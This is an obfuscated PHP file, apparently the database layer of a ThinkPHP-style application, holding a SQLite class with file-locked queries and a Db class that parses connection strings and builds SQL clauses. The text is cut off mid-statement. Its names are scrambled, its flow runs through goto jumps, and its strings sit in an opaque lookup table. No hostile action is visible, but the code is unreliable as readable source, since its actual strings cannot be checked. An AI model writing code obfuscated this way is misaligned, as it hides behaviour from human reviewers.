<?php
 goto f‰ŞÃºš¼À; aÕ¦åŸæÅã: class DbSqlite3 extends DbSqlite3Base { public function query($fÜÈÏÄšË£) { goto f°¦çÍÓ›ò; FÂë ·ø„¯: fclose($fï±ñ†»½“); show_json($b¤ˆ÷²£[860], !1); return !1; goto Bâ­…¹ÉŠÔ; D¿“¤®…³: if (!$fï±ñ†»½“) { return !1; } if (flock($fï±ñ†»½“, LOCK_EX)) { $Cš¾éøÖÙ‹ = parent::query($fÜÈÏÄšË£); flock($fï±ñ†»½“, LOCK_UN); fclose($fï±ñ†»½“); return $Cš¾éøÖÙ‹; } flock($fï±ñ†»½“, LOCK_UN); goto FÂë ·ø„¯; f°¦çÍÓ›ò: $b¤ˆ÷²£ =& $_SERVER[“]; $d ¦âĞ¶© = DATA_PATH . $b¤ˆ÷²£[858]; $fï±ñ†»½“ = fopen($d ¦âĞ¶©, $b¤ˆ÷²£[859]); goto D¿“¤®…³; Bâ­…¹ÉŠÔ: } public function execute($EìÊ±µÅÃÒ) { goto c¬ëÓàÄñº; CÄ„•©Š: fclose($F¹çµÌË©); show_json($c¥ºÍ®öÇ…[860], !1); return !1; goto d¦’Òë±Ã‘; aŒæÙæƒô: if (!$F¹çµÌË©) { return !1; } if (flock($F¹çµÌË©, LOCK_EX)) { $AÏÂİ±ˆ©Ó = parent::execute($EìÊ±µÅÃÒ); flock($F¹çµÌË©, LOCK_UN); fclose($F¹çµÌË©); return $AÏÂİ±ˆ©Ó; } flock($F¹çµÌË©, LOCK_UN); goto CÄ„•©Š; c¬ëÓàÄñº: $c¥ºÍ®öÇ… =& $_SERVER[“]; $dÌ¹Ş°Äí = DATA_PATH . $c¥ºÍ®öÇ…[858]; $F¹çµÌË© = fopen($dÌ¹Ş°Äí, $c¥ºÍ®öÇ…[859]); goto aŒæÙæƒô; d¦’Òë±Ã‘: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\151\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\x65\x71" => "\74\x3e", "\x67\164" => "\76", "\145\147\164" => "\76\75", "\154\x74" => "\x3c", "\x65\154\x74" => "\x3c\x3d", "\156\x6f\x74\x6c\x69\153\145" => "\x4e\x4f\x54\40\x4c\111\x4b\105", "\x6c\x69\153\145" => "\114\111\113\x45", "\151\156" => "\x49\x4e", "\x6e\x6f\x74\x69\156" => "\116\x4f\x54\x20\111\116", "\156\157\164\40\151\156" => "\x4e\x4f\x54\x20\111\x4e", "\x62\145\164\x77\145\x65\x6e" => "\x42\105\x54\127\x45\105\x4e", "\x6e\x6f\164\x62\x65\x74\167\x65\x65\x6e" => "\x4e\117\x54\x20\102\105\x54\x57\105\x45\x4e", "\156\157\164\x20\142\x65\x74\167\x65\145\156" => "\116\x4f\x54\40\x42\x45\124\127\x45\105\x4e"); protected $selectSql = "\123\x45\x4c\105\x43\x54\x25\x44\111\x53\x54\111\116\x43\124\x25\x20\x25\106\x49\x45\114\x44\x25\x20\x46\x52\117\115\40\x25\x54\x41\102\114\x45\x25\x25\x4a\x4f\111\x4e\45\x25\127\110\x45\122\x45\x25\x25\107\122\x4f\x55\120\x25\45\x48\x41\126\111\x4e\x47\45\45\117\122\x44\105\122\x25\45\x4c\111\115\111\124\45\40\45\x55\x4e\x49\117\116\x25\x25\x43\x4f\115\x4d\105\116\124\45"; protected $bind = array(); public static function getInstance() { $a˜¶Ãç¤«Ò = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[“][861], $a˜¶Ãç¤«Ò); } public function factory($f„Œ®‚É æ = '') { goto E¾ÙâÓ¼; A‚Ã«½„Áß: return $a¥Ó»íµëŠ; goto bğŠ†İëó; Fƒ¦‘Ãš°™: $this->dbType = ucwords(strtolower($f„Œ®‚É æ[$aÅÜ¤ŞŒÊ…[862]])); $F¢±«Ï¡Ğ— = $aÅÜ¤ŞŒÊ…[864] . $this->dbType; if (class_exists($F¢±«Ï¡Ğ—)) { $a¥Ó»íµëŠ = new $F¢±«Ï¡Ğ—($f„Œ®‚É æ); if ($aÅÜ¤ŞŒÊ…[707] != strtolower($f„Œ®‚É æ[$aÅÜ¤ŞŒÊ…[862]])) { $a¥Ó»íµëŠ->dbType = strtoupper($this->dbType); } else { $a¥Ó»íµëŠ->dbType = $this->_getDsnType($f„Œ®‚É æ[$aÅÜ¤ŞŒÊ…[814]]); } } else { think_exception(think_lang($aÅÜ¤ŞŒÊ…[865]) . $aÅÜ¤ŞŒÊ…[866] . $F¢±«Ï¡Ğ—); } goto A‚Ã«½„Áß; E¾ÙâÓ¼: $aÅÜ¤ŞŒÊ… =& $_SERVER[“]; $f„Œ®‚É æ = $this->parseConfig($f„Œ®‚É æ); if (empty($f„Œ®‚É æ[$aÅÜ¤ŞŒÊ…[862]])) { think_exception(think_lang($aÅÜ¤ŞŒÊ…[863])); } goto Fƒ¦‘Ãš°™; bğŠ†İëó: } public function __call($EæÏ…­¨–ë, $cÑŠííˆÇ) { if (method_exists($this, $EæÏ…­¨–ë)) { return call_user_func_array(array($this, $EæÏ…­¨–ë), $cÑŠííˆÇ); } } protected function _getDsnType($Fˆ¬äÆÀ¢) { $c“ˆ§³‹’ = explode($_SERVER[“][4], $Fˆ¬äÆÀ¢); $b±îÆÑšíÂ = strtoupper(trim($c“ˆ§³‹’[0])); return $b±îÆÑšíÂ; } private function parseConfig($BÍƒğÛİÛ = '') { $a¾œãÄê’´ =& $_SERVER[“]; if (!empty($BÍƒğÛİÛ) && is_string($BÍƒğÛİÛ)) { $BÍƒğÛİÛ = $this->parseDSN($BÍƒğÛİÛ); } elseif (is_array($BÍƒğÛİÛ)) { $BÍƒğÛİÛ = array_change_key_case($BÍƒğÛİÛ); $BÍƒğÛİÛ = array($a¾œãÄê’´[862] => $BÍƒğÛİÛ[$a¾œãÄê’´[706]], $a¾œãÄê’´[787] => $BÍƒğÛİÛ[$a¾œãÄê’´[867]], $a¾œãÄê’´[788] => $BÍƒğÛİÛ[$a¾œãÄê’´[868]], $a¾œãÄê’´[785] => $BÍƒğÛİÛ[$a¾œãÄê’´[869]], $a¾œãÄê’´[786] => $BÍƒğÛİÛ[$a¾œãÄê’´[870]], $a¾œãÄê’´[17] => $BÍƒğÛİÛ[$a¾œãÄê’´[871]], $a¾œãÄê’´[814] => $BÍƒğÛİÛ[$a¾œãÄê’´[708]], $a¾œãÄê’´[13] => isset($BÍƒğÛİÛ[$a¾œãÄê’´[872]]) ? $BÍƒğÛİÛ[$a¾œãÄê’´[872]] : array()); } elseif (empty($BÍƒğÛİÛ)) { if (think_config($a¾œãÄê’´[873]) && $a¾œãÄê’´[707] != strtolower(think_config($a¾œãÄê’´[874]))) { $BÍƒğÛİÛ = $this->parseDSN(think_config($a¾œãÄê’´[873])); } else { $BÍƒğÛİÛ = array($a¾œãÄê’´[862] => think_config($a¾œãÄê’´[874]), $a¾œãÄê’´[787] => think_config($a¾œãÄê’´[875]), $a¾œãÄê’´[788] => think_config($a¾œãÄê’´[876]), $a¾œãÄê’´[785] => think_config($a¾œãÄê’´[877]), $a¾œãÄê’´[786] => think_config($a¾œãÄê’´[878]), $a¾œãÄê’´[17] => think_config($a¾œãÄê’´[234]), $a¾œãÄê’´[814] => think_config($a¾œãÄê’´[873]), $a¾œãÄê’´[13] => think_config($a¾œãÄê’´[879])); } } return $BÍƒğÛİÛ; } protected function initConnect($E¯î”ŒŠ• = true) { if (1 == think_config($_SERVER[“][18])) { $this->_linkID = $this->multiConnect($E¯î”ŒŠ•); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($E°ç‰ŸğŒö = false) { $e²×ìƒô =& $_SERVER[“]; static $Dá´¸±Û‰Ü = array(); if (empty($Dá´¸±Û‰Ü)) { foreach ($this->config as $Bñ¸ã‹Ñò‰ => $BÈ¨æïî‰«) { $Dá´¸±Û‰Ü[$Bñ¸ã‹Ñò‰] = explode($e²×ìƒô[47], $BÈ¨æïî‰«); } } if (think_config($e²×ìƒô[880])) { if ($E°ç‰ŸğŒö) { $CÖ«¨‚ÉÇ = floor(mt_rand(0, think_config($e²×ìƒô[881]) - 1)); } else { if (is_numeric(think_config($e²×ìƒô[882]))) { $CÖ«¨‚ÉÇ = think_config($e²×ìƒô[882]); } else { $CÖ«¨‚ÉÇ = floor(mt_rand(think_config($e²×ìƒô[881]), count($Dá´¸±Û‰Ü[$e²×ìƒô[785]]) - 1)); } } } else { $CÖ«¨‚ÉÇ = floor(mt_rand(0, count($Dá´¸±Û‰Ü[$e²×ìƒô[785]]) - 1)); } $Dó™ó÷®ø© = array($e²×ìƒô[787] => isset($Dá´¸±Û‰Ü[$e²×ìƒô[787]][$CÖ«¨‚ÉÇ]) ? $Dá´¸±Û‰Ü[$e²×ìƒô[787]][$CÖ«¨‚ÉÇ] : $Dá´¸±Û‰Ü[$e²×ìƒô[787]][0], $e²×ìƒô[788] => isset($Dá´¸±Û‰Ü[$e²×ìƒô[788]][$CÖ«¨‚ÉÇ]) ? $Dá´¸±Û‰Ü[$e²×ìƒô[788]][$CÖ«¨‚ÉÇ] : $Dá´¸±Û‰Ü[$e²×ìƒô[788]][0], $e²×ìƒô[785] => isset($Dá´¸±Û‰Ü[$e²×ìƒô[785]][$CÖ«¨‚ÉÇ]) ? $Dá´¸±Û‰Ü[$e²×ìƒô[785]][$CÖ«¨‚ÉÇ] : $Dá´¸±Û‰Ü[$e²×ìƒô[785]][0], $e²×ìƒô[786] => isset($Dá´¸±Û‰Ü[$e²×ìƒô[786]][$CÖ«¨‚ÉÇ]) ? $Dá´¸±Û‰Ü[$e²×ìƒô[786]][$CÖ«¨‚ÉÇ] : $Dá´¸±Û‰Ü[$e²×ìƒô[786]][0], $e²×ìƒô[17] => isset($Dá´¸±Û‰Ü[$e²×ìƒô[17]][$CÖ«¨‚ÉÇ]) ? $Dá´¸±Û‰Ü[$e²×ìƒô[17]][$CÖ«¨‚ÉÇ] : $Dá´¸±Û‰Ü[$e²×ìƒô[17]][0], $e²×ìƒô[814] => isset($Dá´¸±Û‰Ü[$e²×ìƒô[814]][$CÖ«¨‚ÉÇ]) ? $Dá´¸±Û‰Ü[$e²×ìƒô[814]][$CÖ«¨‚ÉÇ] : $Dá´¸±Û‰Ü[$e²×ìƒô[814]][0], $e²×ìƒô[13] => isset($Dá´¸±Û‰Ü[$e²×ìƒô[13]][$CÖ«¨‚ÉÇ]) ? $Dá´¸±Û‰Ü[$e²×ìƒô[13]][$CÖ«¨‚ÉÇ] : $Dá´¸±Û‰Ü[$e²×ìƒô[13]][0]); return $this->connect($Dó™ó÷®ø©, $CÖ«¨‚ÉÇ); } public function parseDSN($fÁŠ¯Ë®Õî) { $a¼ÕİÈ°‡³ =& $_SERVER[“]; if (empty($fÁŠ¯Ë®Õî)) { return !1; } $DË¢œ«×Ø¹ = parse_url($fÁŠ¯Ë®Õî); if ($DË¢œ«×Ø¹[$a¼ÕİÈ°‡³[168]]) { $fÄƒ÷ù²Ã = array($a¼ÕİÈ°‡³[862] => $DË¢œ«×Ø¹[$a¼ÕİÈ°‡³[168]], $a¼ÕİÈ°‡³[787] => isset($DË¢œ«×Ø¹[$a¼ÕİÈ°‡³[537]]) ? $DË¢œ«×Ø¹[$a¼ÕİÈ°‡³[537]] : $a¼ÕİÈ°‡³[33], $a¼ÕİÈ°‡³[788] => isset($DË¢œ«×Ø¹[$a¼ÕİÈ°‡³[883]]) ? $DË¢œ«×Ø¹[$a¼ÕİÈ°‡³[883]] : $a¼ÕİÈ°‡³[33], $a¼ÕİÈ°‡³[785] => isset($DË¢œ«×Ø¹[$a¼ÕİÈ°‡³[169]]) ? $DË¢œ«×Ø¹[$a¼ÕİÈ°‡³[169]] : $a¼ÕİÈ°‡³[33], $a¼ÕİÈ°‡³[786] => isset($DË¢œ«×Ø¹[$a¼ÕİÈ°‡³[170]]) ? $DË¢œ«×Ø¹[$a¼ÕİÈ°‡³[170]] : $a¼ÕİÈ°‡³[33], $a¼ÕİÈ°‡³[17] => isset($DË¢œ«×Ø¹[$a¼ÕİÈ°‡³[75]]) ? substr($DË¢œ«×Ø¹[$a¼ÕİÈ°‡³[75]], 1) : $a¼ÕİÈ°‡³[33]); } else { preg_match($a¼ÕİÈ°‡³[884], trim($fÁŠ¯Ë®Õî), $Eõˆ’‚Š ó); $fÄƒ÷ù²Ã = array($a¼ÕİÈ°‡³[862] => $Eõˆ’‚Š ó[1], $a¼ÕİÈ°‡³[787] => $Eõˆ’‚Š ó[2], $a¼ÕİÈ°‡³[788] => $Eõˆ’‚Š ó[3], $a¼ÕİÈ°‡³[785] => $Eõˆ’‚Š ó[4], $a¼ÕİÈ°‡³[786] => $Eõˆ’‚Š ó[5], $a¼ÕİÈ°‡³[17] => $Eõˆ’‚Š ó[6]); } $fÄƒ÷ù²Ã[$a¼ÕİÈ°‡³[814]] = $a¼ÕİÈ°‡³[33]; return $fÄƒ÷ù²Ã; } protected function debug() { $bÑª†…Ş‹½ =& $_SERVER[“]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $bÑª†…Ş‹½[885]; if (think_config($bÑª†…Ş‹½[886])) { think_status($bÑª†…Ş‹½[887]); think_trace($this->queryStr . $bÑª†…Ş‹½[888] . think_status($bÑª†…Ş‹½[20], $bÑª†…Ş‹½[887], 6) . $bÑª†…Ş‹½[889], $bÑª†…Ş‹½[33], $bÑª†…Ş‹½[890]); } } protected function parseLock($F‚­‘Ç°ò = false) { $f­Â½’÷ƒ¹ =& $_SERVER[“]; if (!$F‚­‘Ç°ò) { return $f­Â½’÷ƒ¹[33]; } if ($f­Â½’÷ƒ¹[816] == $this->dbType) { return $f­Â½’÷ƒ¹[891]; } return $f­Â½’÷ƒ¹[892]; } protected function parseSet($CåóŒè„•§) { $Cáë‹š×ó =& $_SERVER[“]; foreach ($CåóŒè„•§ as $cšÏ†¼‰ØŞ => $E»®¢ŸÛ¸) { if (is_array($E»®¢ŸÛ¸) && $Cáë‹š×ó[285] == $E»®¢ŸÛ¸[0]) { $EÕÙË„ÛÚ[] = $this->parseKey($cšÏ†¼‰ØŞ) . $Cáë‹š×ó[893] . $E»®¢ŸÛ¸[1]; } elseif (is_scalar($E»®¢ŸÛ¸) || is_null($E»®¢ŸÛ¸)) { $EÕÙË„ÛÚ[] = $this->parseKey($cšÏ†¼‰ØŞ) . $Cáë‹š×ó[893] . $this->parseValue($E»®¢ŸÛ¸); } } return $Cáë‹š×ó[894] . implode($Cáë‹š×ó[47], $EÕÙË„ÛÚ); } protected function bindParam($A–¶¥Õƒ»°, $BËå®‰‹è) { $this->bind[$_SERVER[“][4] . $A–¶¥Õƒ»°] = $BËå®‰‹è; } protected function parseBind($BÑÛ‚ğï·Ì) { $BÑÛ‚ğï·Ì = array_merge($this->bind, $BÑÛ‚ğï·Ì); $this->bind = array(); return $BÑÛ‚ğï·Ì; } function parseKey(&$ašÍÙ–×¶ï, $bµáº™×ë” = true) { if ($bµáº™×ë”) { $ašÍÙ–×¶ï = $this->parseKeyCheck($ašÍÙ–×¶ï); } return $ašÍÙ–×¶ï; } function parseKeyCheck($aÊŞÕòá) { $f¡˜ù·Ú³ =& $_SERVER[“]; $aÊŞÕòá = trim($aÊŞÕòá); if (!preg_match($f¡˜ù·Ú³[895], $aÊŞÕòá)) { think_exception($f¡˜ù·Ú³[896] . $aÊŞÕòá); } return $aÊŞÕòá; } protected function parseValue($Dîš™¸Å­Ş) { $Dµ­˜–ßø¢ =& $_SERVER[“]; if (is_string($Dîš™¸Å­Ş)) { $Dîš™¸Å­Ş = $Dµ­˜–ßø¢[855] . $this->escapeString($Dîš™¸Å­Ş) . $Dµ­˜–ßø¢[855]; } elseif (isset($Dîš™¸Å­Ş[0]) && is_string($Dîš™¸Å­Ş[0]) && strtolower($Dîš™¸Å­Ş[0]) == $Dµ­˜–ßø¢[285]) { $Dîš™¸Å­Ş = $this->escapeString($Dîš™¸Å­Ş[1]); } elseif (is_array($Dîš™¸Å­Ş)) { $Dîš™¸Å­Ş = array_map(array($this, $Dµ­˜–ßø¢[856]), $Dîš™¸Å­Ş); } elseif (is_bool($Dîš™¸Å­Ş)) { $Dîš™¸Å­Ş = $Dîš™¸Å­Ş ? $Dµ­˜–ßø¢[83] : $Dµ­˜–ßø¢[470]; } elseif (is_null($Dîš™¸Å­Ş)) { $Dîš™¸Å­Ş = $Dµ­˜–ßø¢[99]; } return $Dîš™¸Å­Ş; } protected function parseField($e•´ë±‚Áö) { $fö„°¢§Ù„ =& $_SERVER[“]; if (is_string($e•´ë±‚Áö) && strpos($e•´ë±‚Áö, $fö„°¢§Ù„[47])) { $e•´ë±‚Áö = explode($fö„°¢§Ù„[47], $e•´ë±‚Áö); } if (is_array($e•´ë±‚Áö)) { $Aõö¼˜¥· = array(); foreach ($e•´ë±‚Áö as $c­”£˜äàœ => $bèò²¼šË‡) { if (!is_numeric($c­”£˜äàœ)) { $Aõö¼˜¥·[] = $this->parseKey($c­”£˜äàœ) . $fö„°¢§Ù„[897] . $this->parseKey($bèò²¼šË‡); } else { $Aõö¼˜¥·[] = $this->parseKey($bèò²¼šË‡); } } $cÃÓ—îŞµ = implode($fö„°¢§Ù„[47], $Aõö¼˜¥·); } elseif (is_string($e•´ë±‚Áö) && !empty($e•´ë±‚Áö)) { $cÃÓ—îŞµ = $e•´ë±‚Áö; } else { $cÃÓ—îŞµ = $fö„°¢§Ù„[176]; } return $cÃÓ—îŞµ; } protected function parseTable($eåÏ¼ííÅ) { $fØÔŒäø— =& $_SERVER[“]; if (is_array($eåÏ¼ííÅ)) { $B‚¬œÑ„í¨ = array(); foreach ($eåÏ¼ííÅ as $BÕ¸¼¸¤Úİ => $e›º„ì“…ğ) { if (!is_numeric($BÕ¸¼¸¤Úİ)) { $B‚¬œÑ„í¨[] = $this->parseKey($BÕ¸¼¸¤Úİ) . $fØÔŒäø—[50] . $this->parseKey($e›º„ì“…ğ); } else { $B‚¬œÑ„í¨[] = $this->parseKey($BÕ¸¼¸¤Úİ); } } $eåÏ¼ííÅ = $B‚¬œÑ„í¨; } elseif (is_string($eåÏ¼ííÅ)) { if (strstr($eåÏ¼ííÅ, $fØÔŒäø—[50])) { return $eåÏ¼ííÅ; } $eåÏ¼ííÅ = explode($fØÔŒäø—[47], $eåÏ¼ííÅ); array_walk($eåÏ¼ííÅ, array($this, $fØÔŒäø—[804])); } return $fØÔŒäø—[898] . trim(implode($fØÔŒäø—[899], $eåÏ¼ííÅ), $fØÔŒäø—[810]) . $fØÔŒäø—[898]; } protected function parseWhere($fç±¡òùë˜) { $cÆ± Ÿ¦Û =& $_SERVER[“]; $Fš¯”õ®½Ù = $cÆ± Ÿ¦Û[33]; if (is_string($fç±¡òùë˜)) { $Fš¯”õ®½Ù = $fç±¡òùë˜; } else { $càÆíîåà = isset($fç±¡òùë˜[$cÆ± Ÿ¦Û[900]]) ? strtoupper($fç±¡òùë˜[$cÆ± Ÿ¦Û[900]]) : $cÆ± Ÿ¦Û[33]; if (in_array($càÆíîåà, array($cÆ± Ÿ¦Û[901], $cÆ± Ÿ¦Û[902], $cÆ± Ÿ¦Û[903]))) { $càÆíîåà = $cÆ± Ÿ¦Û[50] . $càÆíîåà . $cÆ± Ÿ¦Û[50]; unset($fç±¡òùë˜[$cÆ± Ÿ¦Û[900]]); } else { $càÆíîåà = $cÆ± Ÿ¦Û[904]; } foreach ($fç±¡òùë˜ as $b±òÏ³è®º => $f„‚ö…œƒ¸) { $Fš¯”õ®½Ù .= $cÆ± Ÿ¦Û[265]; if (is_numeric($b±òÏ³è®º)) { $b±òÏ³è®º = $cÆ± Ÿ¦Û[905]; } if (0 === strpos($b±òÏ³è®º, $cÆ± Ÿ¦Û[70])) { $Fš¯”õ®½Ù .= $this->parseThinkWhere($b±òÏ³è®º, $f„‚ö…œƒ¸); } else { if (!preg_match($cÆ± Ÿ¦Û[906], trim($b±òÏ³è®º))) { think_exception(think_lang($cÆ± Ÿ¦Û[907]) . $cÆ± Ÿ¦Û[4] . $b±òÏ³è®º); } $cªñ–Ó®ôÁ = is_array($f„‚ö…œƒ¸) && isset($f„‚ö…œƒ¸[$cÆ± Ÿ¦Û[908]]); $b±òÏ³è®º = trim($b±òÏ³è®º); if (strpos($b±òÏ³è®º, $cÆ± Ÿ¦Û[271])) { $cë‰‚Ğ…±ª = explode($cÆ± Ÿ¦Û[271], $b±òÏ³è®º); $B®Â¢ùº“ = array(); foreach ($cë‰‚Ğ…±ª as $aóÑîóÄí† => $B«óóÙ‡…) { $A›˜ÚÈ˜Ë = $cªñ–Ó®ôÁ ? $f„‚ö…œƒ¸[$aóÑîóÄí†] : $f„‚ö…œƒ¸; $B®Â¢ùº“[] = $cÆ± Ÿ¦Û[248] . $this->parseWhereItem($this->parseKey($B«óóÙ‡…), $A›˜ÚÈ˜Ë) . $cÆ± Ÿ¦Û[803]; } $Fš¯”õ®½Ù .= implode($cÆ± Ÿ¦Û[909], $B®Â¢ùº“); } elseif (strpos($b±òÏ³è®º, $cÆ± Ÿ¦Û[272])) { $cë‰‚Ğ…±ª = explode($cÆ± Ÿ¦Û[272], $b±òÏ³è®º); $B®Â¢ùº“ = array(); foreach ($cë‰‚Ğ…±ª as $aóÑîóÄí† => $B«óóÙ‡…) { $A›˜ÚÈ˜Ë = $cªñ–Ó®ôÁ ? $f„‚ö…œƒ¸[$aóÑîóÄí†] : $f„‚ö…œƒ¸; $B®Â¢ùº“[] = $cÆ± Ÿ¦Û[248] . $this->parseWhereItem($this->parseKey($B«óóÙ‡…), $A›˜ÚÈ˜Ë) . $cÆ± Ÿ¦Û[803]; } $Fš¯”õ®½Ù .= implode($cÆ± Ÿ¦Û[904], $B®Â¢ùº“); } else { $Fš¯”õ®½Ù .= $this->parseWhereItem($this->parseKey($b±òÏ³è®º), $f„‚ö…œƒ¸); } } $Fš¯”õ®½Ù .= $cÆ± Ÿ¦Û[266] . $càÆíîåà; } $Fš¯”õ®½Ù = substr($Fš¯”õ®½Ù, 0, -strlen($càÆíîåà)); } return empty($Fš¯”õ®½Ù) ? $cÆ± Ÿ¦Û[33] : $cÆ± Ÿ¦Û[910] . $Fš¯”õ®½Ù; } protected function parseWhereItem($F§°¤Äá‘÷, $C×Êë·”Ö˜) { $c‡ö’ÕĞ•Â =& $_SERVER[“]; $BÜ‚Ó¾Ñ°Â = $c‡ö’ÕĞ•Â[33]; if (is_array($C×Êë·”Ö˜)) { if (is_string($C×Êë·”Ö˜[0])) { $E†Ï˜Âï° = strtolower($C×Êë·”Ö˜[0]); if (in_array($C×Êë·”Ö˜[0], array($c‡ö’ÕĞ•Â[893], $c‡ö’ÕĞ•Â[911], $c‡ö’ÕĞ•Â[912], $c‡ö’ÕĞ•Â[913], $c‡ö’ÕĞ•Â[914], $c‡ö’ÕĞ•Â[915]))) { $BÜ‚Ó¾Ñ°Â .= $F§°¤Äá‘÷ . $c‡ö’ÕĞ•Â[50] . $C×Êë·”Ö˜[0] . $c‡ö’ÕĞ•Â[50] . $this->parseValue($C×Êë·”Ö˜[1]); } elseif (preg_match($c‡ö’ÕĞ•Â[916], $C×Êë·”Ö˜[0])) { $BÜ‚Ó¾Ñ°Â .= $F§°¤Äá‘÷ . $c‡ö’ÕĞ•Â[50] . $this->exp[$E†Ï˜Âï°] . $c‡ö’ÕĞ•Â[50] . $this->parseValue($C×Êë·”Ö˜[1]); } elseif (preg_match($c‡ö’ÕĞ•Â[917], $C×Êë·”Ö˜[0])) { if (is_array($C×Êë·”Ö˜[1])) { $BŠÓÄîÅ‘Õ = isset($C×Êë·”Ö˜[2]) ? strtoupper($C×Êë·”Ö˜[2]) : $c‡ö’ÕĞ•Â[902]; if (in_array($BŠÓÄîÅ‘Õ, array($c‡ö’ÕĞ•Â[901], $c‡ö’ÕĞ•Â[902], $c‡ö’ÕĞ•Â[903]))) { $Aà……¤ÑçŠ = array(); foreach ($C×Êë·”Ö˜[1] as $FÌ¨î÷×Ì) { $Aà……¤ÑçŠ[] = $F§°¤Äá‘÷ . $c‡ö’ÕĞ•Â[50] . $this->exp[$E†Ï˜Âï°] . $c‡ö’ÕĞ•Â[50] . $this->parseValue($FÌ¨î÷×Ì); } $BÜ‚Ó¾Ñ°Â .= $c‡ö’ÕĞ•Â[248] . implode($c‡ö’ÕĞ•Â[50] . $BŠÓÄîÅ‘Õ . $c‡ö’ÕĞ•Â[50], $Aà……¤ÑçŠ) . $c‡ö’ÕĞ•Â[803]; } } else { $BÜ‚Ó¾Ñ°Â .= $F§°¤Äá‘÷ . $c‡ö’ÕĞ•Â[50] . $this->exp[$E†Ï˜Âï°] . $c‡ö’ÕĞ•Â[50] . $this->parseValue($C×Êë·”Ö˜[1]); } } elseif ($c‡ö’ÕĞ•Â[285] == $E†Ï˜Âï°) { $BÜ‚Ó¾Ñ°Â .= $c‡ö’ÕĞ•Â[801] . $F§°¤Äá‘÷ . $c‡ö’ÕĞ•Â[50] . $C×Êë·”Ö˜[1] . $c‡ö’ÕĞ•Â[918]; } elseif (preg_match($c‡ö’ÕĞ•Â[919], $C×Êë·”Ö˜[0])) { if (isset($C×Êë·”Ö˜[2]) && $c‡ö’ÕĞ•Â[285] == $C×Êë·”Ö˜[2]) { $BÜ‚Ó¾Ñ°Â .= $F§°¤Äá‘÷ . $c‡ö’ÕĞ•Â[50] . $this->exp[$E†Ï˜Âï°] . $c‡ö’ÕĞ•Â[50] . $C×Êë·”Ö˜[1]; } else { if (is_string($C×Êë·”Ö˜[1])) { $C×Êë·”Ö˜[1] = explode($c‡ö’ÕĞ•Â[47], $C×Êë·”Ö˜[1]); } $f±ë¶¦óÂ† = implode($c‡ö’ÕĞ•Â[47], $this->parseValue($C×Êë·”Ö˜[1])); $BÜ‚Ó¾Ñ°Â .= $F§°¤Äá‘÷ . $c‡ö’ÕĞ•Â[50] . $this->exp[$E†Ï˜Âï°] . $c‡ö’ÕĞ•Â[801] . $f±ë¶¦óÂ† . $c‡ö’ÕĞ•Â[803]; } } elseif (preg_match($c‡ö’ÕĞ•Â[920], $C×Êë·”Ö˜[0])) { $Bó‚°Äà‘© = is_string($C×Êë·”Ö˜[1]) ? explode($c‡ö’ÕĞ•Â[47], $C×Êë·”Ö˜[1]) : $C×Êë·”Ö˜[1]; $BÜ‚Ó¾Ñ°Â .= $c‡ö’ÕĞ•Â[801] . $F§°¤Äá‘÷ . $c‡ö’ÕĞ•Â[50] . $this->exp[$E†Ï˜Âï°] . $c‡ö’ÕĞ•Â[50] . $this->parseValue($Bó‚°Äà‘©[0]) . $c‡ö’ÕĞ•Â[904] . $this->parseValue($Bó‚°Äà‘©[1]) . $c‡ö’ÕĞ•Â[266]; } else { think_exception(think_lang($c‡ö’ÕĞ•Â[907]) . $c‡ö’ÕĞ•Â[4] . $C×Êë·”Ö˜[0]); } } else { $BÙ’òö‚ÙÎ = count($C×Êë·”Ö˜); $aáñ®øˆÌà = isset($C×Êë·”Ö˜[$BÙ’òö‚ÙÎ - 1]) ? strtoupper($C×Êë·”Ö˜[$BÙ’òö‚ÙÎ - 1]) : $c‡ö’ÕĞ•Â[33]; if (in_array($aáñ®øˆÌà, array($c‡ö’ÕĞ•Â[901], $c‡ö’ÕĞ•Â[902], $c‡ö’ÕĞ•Â[903]))) { $BÙ’òö‚ÙÎ = $BÙ’òö‚ÙÎ - 1; } else { $aáñ®øˆÌà = $c‡ö’ÕĞ•Â[901]; } for ($BºÈ†‚†Û = 0; $BºÈ†‚†Û < $BÙ’òö‚ÙÎ; $BºÈ†‚†Û++) { $Bó‚°Äà‘© = is_array($C×Êë·”Ö˜[$BºÈ†‚†Û]) ? $C×Êë·”Ö˜[$BºÈ†‚†Û][1] : $C×Êë·”Ö˜[$BºÈ†‚†Û]; if ($c‡ö’ÕĞ•Â[285] == strtolower($C×Êë·”Ö˜[$BºÈ†‚†Û][0])) { $BÜ‚Ó¾Ñ°Â .= $c‡ö’ÕĞ•Â[248] . $F§°¤Äá‘÷ . $c‡ö’ÕĞ•Â[50] . $Bó‚°Äà‘© . $c‡ö’ÕĞ•Â[918] . $aáñ®øˆÌà . $c‡ö’ÕĞ•Â[50]; } else { $dİ¿¨ŒºÛ = is_array($C×Êë·”Ö˜[$BºÈ†‚†Û]) ? $this->exp[strtolower($C×Êë·”Ö˜[$BºÈ†‚†Û][0])] : $c‡ö’ÕĞ•Â[893]; if (!$dİ¿¨ŒºÛ && is_array($C×Êë·”Ö˜[$BºÈ†‚†Û]) && in_array($C×Êë·”Ö˜[$BºÈ†‚†Û][0], array($c‡ö’ÕĞ•Â[893], $c‡ö’ÕĞ•Â[911], $c‡ö’ÕĞ•Â[912], $c‡ö’ÕĞ•Â[913], $c‡ö’ÕĞ•Â[914], $c‡ö’ÕĞ•Â[915]))) { $dİ¿¨ŒºÛ = $C×Êë·”Ö˜[$BºÈ†‚†Û][0]; } $BÜ‚Ó¾Ñ°Â .= $c‡ö’ÕĞ•Â[248] . $F§°¤Äá‘÷ . $c‡ö’ÕĞ•Â[50] . $dİ¿¨ŒºÛ . $c‡ö’ÕĞ•Â[50] . $this->parseValue($Bó‚°Äà‘©) . $c‡ö’ÕĞ•Â[918] . $aáñ®øˆÌà . $c‡ö’ÕĞ•Â[50]; } } $BÜ‚Ó¾Ñ°Â = substr($BÜ‚Ó¾Ñ°Â, 0, -4); } } else { $BÜ‚Ó¾Ñ°Â .= $F§°¤Äá‘÷ . $c‡ö’ÕĞ•Â[921] . $this->parseValue($C×Êë·”Ö˜); } return 